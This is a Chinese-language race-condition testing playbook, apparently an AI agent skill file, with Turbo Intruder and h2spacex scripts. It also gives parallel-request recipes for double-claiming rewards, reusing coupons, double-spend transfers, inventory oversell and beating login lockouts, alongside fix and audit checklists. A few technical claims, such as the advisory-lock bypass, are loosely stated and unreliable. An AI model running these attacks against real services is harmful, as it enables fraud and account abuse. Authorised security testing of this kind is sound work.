# 技能：竞态条件 — 测试与利用手册

> **AI 加载指令**：将竞态条件视为 **授权/状态完整性** 问题：非原子性读后写操作允许多个请求观察到过时状态。优先处理 **一次性** 或 **平衡类** 操作。结合 **并行传输**（HTTP/1.1 最后字节同步、HTTP/2 单包、Turbo Intruder 门控）与应用程序证据（重复成功响应、余额不一致、重复账目行）。**仅授权测试**。路由提示：对于业务流程、优惠券、库存或一次性奖励，从本技能开始并交叉加载 `business-logic-vulnerabilities`。

---

## 0. 快速入门 — 首先测试什么

针对 **检查** 和 **更新** 不太可能是一个单一原子数据库操作的端点：

| 优先级 | 操作类别 | 示例路径 / 参数 |
|--------|----------|----------------|
| 1 | 一次性兑换 / 优惠券 / 奖励 | `redeem`, `apply_coupon`, `claim_reward`, `voucher` |
| 2 | 余额 / 配额 / 库存扣减 | `transfer`, `purchase`, `reserve`, `inventory` |
| 3 | 邀请 / 推荐奖励 | `invite_accept`, `referral_claim` |
| 4 | 密码 / 邮箱 / MFA 验证 | `verify_token`, `confirm_email`, `reset_password` |
| 5 | 无强键的看似幂等的 API | 应该只成功一次的 `POST` |

**初步操作（概念性）**：

1. 在代理中捕获 **状态改变** 请求。
2. 以 **工具允许的最大并行性** 发送 **20–100** 份副本。
3. 分类结果：**预期 0/1 次成功** 与 **N 次成功** 或 **不一致的最终状态**。

---

## 1. 核心概念

### 1.1 TOCTOU（检查时到使用时）

```
线程 A                    线程 B
   |                            |
   +-- 检查（资源 OK）      |
   |                            +-- 检查（资源 OK）  ← 两者都看到 "OK"
   +-- 使用 / 更新             |
   |                            +-- 使用 / 更新           ← 重复效果
```

**TOCTOU** 意味着 **决策**（检查）和 **变异**（使用）不是一步不可分割的操作。

### 1.2 非原子性读后写

典型易受攻击的伪流程：

```text
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

两个并发请求可以在任一 `UPDATE` 提交之前都通过 `if`。

### 1.3 数据库级与应用程序级锁定间隙

| 层级 | 出现的问题 |
|-------|------------------|
| **应用程序** | 内存标志、缓存或会话说“尚未使用”，而数据库已更新——或者相反。 |
| **ORM / 服务** | 两个实例，没有分布式锁；每个实例都认为它拥有决策权。 |
| **数据库** | 缺少 `SELECT … FOR UPDATE`，隔离级别不正确，或逻辑跨多个语句且没有事务。 |
| **API 网关** | 每个IP的速率限制是 **检查后增量** — 并行突发通过重复检查。 |

**提示**：`UNIQUE` 约束和 **幂等键** 通常会消除整个错误类别——测试应用程序是否在热路径上 **强制执行** 它们。

---

## 2. 攻击模式

### 2.1 限制溢出（双重兑换 / 双重声明）

并行发送 **相同** 的认证请求多次：

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.example
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

**成功信号**：HTTP `200`/`201` 多于一次，重复账目条目，或余额高于策略允许的范围。

### 2.2 通过同时性绕过速率限制

如果限制作为 **每次请求检查的计数器** 实现，而没有原子增量：

```http
POST /api/v1/login HTTP/1.1
Host: target.example
Content-Type: application/json

{"email":"victim@example.com","password":"wrong"}
```

在一个波次中发射 **N** 个并行尝试；与 **N** 个顺序尝试进行比较。

**成功信号**：接受的失败次数多于文档规定的上限，或者当突发在一个窗口内完成时，锁定期从未触发。

### 2.3 多步利用（绕过管道）

工作流：`创建 → 付款 → 确认`。如果 **确认** 没有使用密码学绑定到 **付款** 完成情况：

1. 从同一会话/项目开始两个并行管道。
2. 在 **付款** 在通道 A 中仍在飞行或被放弃时，在通道 B 上完成 **确认**。

**成功信号**：项目被标记为已支付/已发货，但没有匹配的付款，或状态跳回。

---

## 3. HTTP/1.1 最后字节同步

**想法**：所有请求 **阻塞**，直到每个套接字都发送了除正文最后字节外的完整请求；然后一起释放最后字节，以便服务器以紧密的集群接收它们。

```text
客户端 1: [头部 + 正文 - 1 字节] ----阻塞----+
客户端 2: [头部 + 正文 - 1 字节] ----阻塞----+--> 一起释放最后字节
客户端 N: [头部 + 正文 - 1 字节] ----阻塞----+
```

**原因**：与 Repeater 中的简单顺序粘贴相比，减少了 **网络抖动** 之间的副本。

**工具**：自定义脚本、某些 Burp 扩展，或 **Turbo Intruder** `门控` 模式（见 §5）作为同步释放的实际替代品。

---

## 4. HTTP/2 单包攻击

**想法**：多路复用几个完整的 HTTP/2 流，并 **合并** 他们的帧，以便所有请求的第一个字节在同一 TCP 段（或最小间隔）退出网卡。接收端调度程序然后以 **亚毫秒** 间隔处理它们。

**Burp Repeater（现代工作流）**：

1. 打开多个选项卡或选择多个请求。
2. 使用 **发送组（并行）** / **单包攻击**（如果可用）。
3. 如果支持，优先选择 HTTP/2 而不是目标。

```text
  [ 请求 A 流 ]
  [ 请求 B 流 ]  --HTTP/2-->  一个突发 -->  应用程序工作池
  [ 请求 C 流 ]
```

**它通常比 HTTP/1.1 最后字节技巧更有效**：线路上更紧密的对齐；对每个连接的序列化依赖性更小。

---

## 5. Turbo Intruder 模板

存储库：[PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder)（Burp Suite 扩展）。

### 5.1 模板 1 — 相同端点，门控释放

**设置**：`concurrentConnections=30`, `requestsPerConnection=30`，使用 **门控** 以便所有线程一起发射。

**核心模式**（重复 N 次，然后释放）：

```python
for _ in range(N):
    engine.queue(request, gate='race1')
engine.openGate('race1')
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**头部要求**（每个排队副本唯一，用于日志关联；Turbo Intruder 负载占位符）：

```http
x-request: %s
```

Turbo Intruder 在与词表（或其他负载源）配对时替换 `%s` 每个请求——在将基础请求发送到 Turbo Intruder 之前，在 Repeater 中保留此头部。对 HTTP 不区分大小写；使用一致的名称进行日志 grep。

### 5.2 模板 2 — 多端点，相同门控

**模式**：一个 **POST** 到 **target-1**（状态改变）加上 **许多 GET** 到 **target-2**（读取侧）一起释放，以扩大 TOCTOU 窗口观察。

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    engine.queue(post_to_target1, gate='race1')
    for _ in range(30):
        engine.queue(get_target2, gate='race1')

    engine.openGate('race1')
```

如果端点不同，通过复制 `RequestEngine` 实例来调整主机/路径（Turbo Intruder 支持多个引擎——咨询您 Burp 版本的上游文档）。

---

## 6. CVE 参考 — CVE-2022-4037

**CVE-2022-4037**（GitLab CE/EE）：导致 **验证电子邮件地址伪造** 的竞态条件，当产品作为 **OAuth 身份提供者** 时存在风险——第三方账户链接/影响场景。**CWE-362**。在公共研究中使用 **HTTP/2 单包** 风格的定时来赢得狭窄窗口。

**测试人员的启示**：电子邮件验证、OAuth 链接和“确认所有权”流程是高价值的竞态目标——不仅仅是优惠券和余额。

**参考（官方 / 中立）**：

- [NVD — CVE-2022-4037](https://nvd.nist.gov/vuln/detail/CVE-2022-4037)
- GitLab 安全公告和受影响版本范围的供应商 CVE JSON

---

## 7. 工具

| 工具 | 角色 |
|------|------|
| [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) | 高并发重放，**门控**，Burp 中的脚本。 |
| [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) | 针对 **竞态** 的 HTTP 客户端模式（验证与您的堆栈兼容性）。 |
| [nxenon/h2spacex](https://github.com/nxenon/h2spacex) | HTTP/2 低级 / 单包风格实验（负责任地使用，仅授权目标）。 |
| **Burp Suite — Repeater** | **发送组（并行）** / **单包攻击** 用于多请求同步。 |

---

## 8. 决策树

```text
                         START: 状态改变 API?
                                    |
                     NO -----------+---------- YES
                      |                        |
                   停止此处              一次性 / 余额 / 验证?
                                                    |
                          +-------------------------+-------------------------+
                          |                         |                         |
                    优惠券类                 速率限制                  多步
                          |                         |                         |
                   并行相同请求          并行与顺序比较         并行管道
                          |                         |                         |
                   重复成功?           限制超限?          状态不匹配?
                     /       \                    /       \                  /       \
                   YES       NO                 YES       NO               YES       NO
                    |         |                  |         |                |         |
              报告 +    尝试 HTTP/2        报告 +    尝试 TI        报告 +   深入
              证据    单包攻击        证据    门控                     每步
                    |         |                  |         |                |         |
                    +----+----+                  +----+----+                +----+----+
                         |                            |                          |
                    工具选择                    工具选择                  工具选择
                         v                            v                          v
              Burp 组 / h2spacex            TI 门控 / Raceocat          TI + 跟踪 ID
```

**如何确认（证据清单）**：

1. **可重复** 的并行性下的重复成功，而不是不可靠的单次重试。
2. **服务器端** 证据：两行、两个电子邮件、两个授权，或错误的最终余额。
3. **关联** 与 `x-request`（或类似）标记或日志中的唯一正文字段（授权环境）。

**路由总结**：如果场景更多关于业务规则、定价或工作流绕过，请加载 `skills/business-logic-vulnerabilities/SKILL.md`；此文件侧重于 **并发和传输层同步**。

---

## 9. HTTP/2 单包攻击 — 详细机制

### 9.1 TCP Nagle 算法与帧合并

TCP 的 Nagle 算法（RFC 896）缓冲小写写操作，并将它们合并成较少、较大的段。当 HTTP/2 客户端快速连续写入多个 HEADERS+DATA 帧 **而没有在它们之间刷新** 时，内核将它们合并成一个 TCP 段（最多 MSS，通常在以太网上约为 1460 字节）。

```text
应用层:   [流 1 H+D] [流 3 H+D] [流 5 H+D]
                            ↓ TCP Nagle 合并 ↓
TCP 段:   [流 1 H+D | 流 3 H+D | 流 5 H+D]  ← 线路上一个包
```

- `TCP_NODELAY` **禁用**（默认）→ Nagle 激活 → 自然发生合并
- 如果 `TCP_NODELAY` 被设置，客户端必须使用 `writev()` / gather-write 系统调用来批量帧
- 实际限制：~20–30 个小请求每 1460 字节 MSS；超过此限制将跨包分割并降低同步

### 9.2 服务器端请求队列处理

```text
NIC 中断 → 内核接收缓冲区 → HTTP/2 解复用器 → 并发调度

  ┌─ 流 1 → 工作线程 A ─┐
  ├─ 流 3 → 工作线程 B ─┤  亚微秒间隔
  └─ 流 5 → 工作线程 C ┘
```

1. 单个 `recv()` 调用返回整个段
2. HTTP/2 帧解析器从同一段解复用流
3. 调度程序分发到应用程序工作池

第一个到最后一个请求的调度间隙：**< 100 μs** 在现代服务器上——比 HTTP/1.1 最后字节同步（~1–5 ms 网络抖动）大几个数量级。

### 9.3 HTTP/2 与 HTTP/1.1 最后字节比较

| 因素 | HTTP/2 单包 | HTTP/1.1 最后字节 |
|--------|---------------------|-------------------|
| 连接需要 | 1 | N (每个请求一个) |
| 线路同步 | 相同 TCP 段 | N 个段“同时”释放 |
| 网络抖动影响 | 零（相同包） | 每个连接有独立的 RTT |
| 服务器调度间隙 | < 100 μs | 典型 1–5 ms |
| 实际限制 | ~20–30 个请求每 MTU | 受连接设置限制 |

### 9.4 使用 h2spacex 的实际执行

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(
    hostname='target.example.com',
    port_number=443
)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

---

## 10. 数据库隔离级别利用矩阵

| 隔离级别 | 利用现象 | 攻击窗口 | 典型易受攻击模式 |
|----------------|---------------------|---------------|---------------------------|
| **READ UNCOMMITTED** | 脏读 | 线程 B 读取线程 A 的未提交写入 | `SELECT balance` 看到正在进行的扣减，继续使用过时逻辑 |
| **READ COMMITTED** | 不可重复读 (TOCTOU) | 两个线程读取已提交的余额，两者都通过检查，两者都扣减 | `SELECT` → 应用程序检查 → `UPDATE` 而没有 `FOR UPDATE` |
| **REPEATABLE READ** | 幻读 | 快照隔离隐藏并发插入；两个线程看到“0 个声明”并插入 | `INSERT IF NOT EXISTS` 模式没有 `UNIQUE` 约束 |
| **SERIALIZABLE** | 通知锁绕过 | 应用程序使用 `pg_advisory_lock()` / `GET_LOCK()` 使用错误的范围或可导出的键 | 从用户输入获取锁键；会话与事务范围不匹配 |

### READ COMMITTED TOCTOU（生产中最常见）

```sql
-- 线程 A                            -- 线程 B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- 返回 100            WHERE id=1;  -- 返回 100
-- 应用程序: 100 >= 100 ✓               -- 应用程序: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- 余额 = 0                 COMMIT; -- 余额 = -100 ← 双重花费
```

**修复验证**：`SELECT ... FOR UPDATE` 应该阻塞线程 B 的 `SELECT`，直到线程 A 提交。

### REPEATABLE READ 幻读插入

```sql
-- 线程 A (T0 时的快照)           -- 线程 B (T0 时的快照)
SELECT count(*) FROM claims            SELECT count(*) FROM claims
  WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';
-- 返回 0 (快照)                -- 返回 0 (快照)
INSERT INTO claims ...;                INSERT INTO claims ...;
COMMIT; -- 成功                    COMMIT; -- 成功 ← 重复声明
```

**修复**：`UNIQUE(user_id, coupon_id)` 约束会导致一个 INSERT 失败，无论隔离级别如何，都会出现重复键错误。

### SERIALIZABLE 通知锁绕过

```sql
-- 应用程序打算：每个优惠券一个锁
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- 绕过向量：
--   1. 锁是会话范围的，但事务回滚 → 锁仍然存在，下一个事务跳过
--   2. 不同代码路径达到声明逻辑，没有获取锁
--   3. 攻击者通过替代 API 端点触发声明，该端点没有锁定
```

### 快速审计清单

```text
□ SHOW TRANSACTION ISOLATION LEVEL — 数据库正在运行什么级别?
□ 热路径使用 SELECT ... FOR UPDATE 或显式行锁吗?
□ 检查后操作序列是否在单个事务内?
□ 关键状态表是否强制执行了 UNIQUE 约束?
□ 多实例部署：是否存在分布式锁（Redis SETNX / Zookeeper）?
```

---

## 11. 限制溢出攻击模式

### 11.1 优惠券 / 促销代码重复使用

```text
目标:   POST /api/apply-coupon {"code":"SUMMER50"}
预期: 每个用户一次使用
攻击:   20 个并行相同请求
证据: 重复的 200 响应，最终订单总额 = N × 应用的折扣
```

变体：相同优惠券跨不同购物车项目；应用优惠券 + 并行结账（优惠券仅在结账时消耗）。

### 11.2 投票 / 评分操纵

```text
目标:   POST /api/vote {"post_id":123,"direction":"up"}
预期: 每个用户每个帖子一次投票
攻击:   50 个并行投票请求
证据: 投票数 += N，或数据库显示相同用户+帖子的多个投票行
```

### 11.3 余额双重花费

```text
目标:   POST /api/transfer {"to":"attacker","amount":100}
余额: 正好 100
攻击:   2+ 个并行转账
证据: 两者都成功，发送方余额为负，接收方收到 200
```

更高价值的变体：提款到外部系统（加密货币、银行电汇），其中撤销困难。

### 11.4 库存超卖

```text
目标:   POST /api/purchase {"item_id":"limited_edition","qty":1}
库存: 剩余 1 个
攻击:   20 个并行购买请求
证据: 创建多个订单，库存计数器为负
```

复合攻击：添加到购物车和结账是单独的步骤，每个步骤都独立检查库存。

### 11.5 推荐奖励

```text
目标:   POST /api/referral/claim {"code":"REF_ABC"}
预期: 每个被推荐用户一次声明
攻击: 从同一会话并行声明
证据: 奖励多次计入推荐人
```

---

## 12. 单包多端点攻击

不是 N 个相同请求的副本，而是将请求发送到 **不同端点** 的一个 HTTP/2 单包突发。这通过同时命中检查和使用路径来扩大 TOCTOU 窗口。

### 模式 1：状态检查 + 状态改变

```text
单个 TCP 段:
  流 1: GET  /api/balance       ← 探测预状态
  流 3: POST /api/transfer      ← 改变
  流 5: POST /api/transfer      ← 改变（重复）
  流 7: GET  /api/balance       ← 探测后状态
```

余额在流 1 和流 7 之间不一致确认竞态窗口被击中。

### 模式 2：跨资源竞态

```text
单个 TCP 段:
  流 1: POST /api/coupon/apply   ← 应用折扣
  流 3: POST /api/order/checkout ← 完成订单
```

如果优惠券应用和结账独立检查价格，则可能在结账锁定价格后应用折扣。

### 模式 3：身份验证 + 特权操作

```text
单个 TCP 段:
  流 1: POST /api/email/verify?token=TOKEN  ← 验证电子邮件
  流 3: POST /api/account/upgrade            ← 需要验证的电子邮件
```

升级可能在验证正在处理但尚未提交的短暂窗口内成功。

### 实际设置

Burp Repeater：将针对 **不同路径** 的请求添加到同一组 → "发送组（单包）"。

```python
headers_balance = [(':method','GET'), (':path','/api/balance'), ...]
headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]

all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]
all_bodies = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']

h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)
```

---

## 相关

- **business-logic-vulnerabilities** — 工作流、优惠券滥用和逻辑优先检查清单 (`../business-logic-vulnerabilities/SKILL.md`).
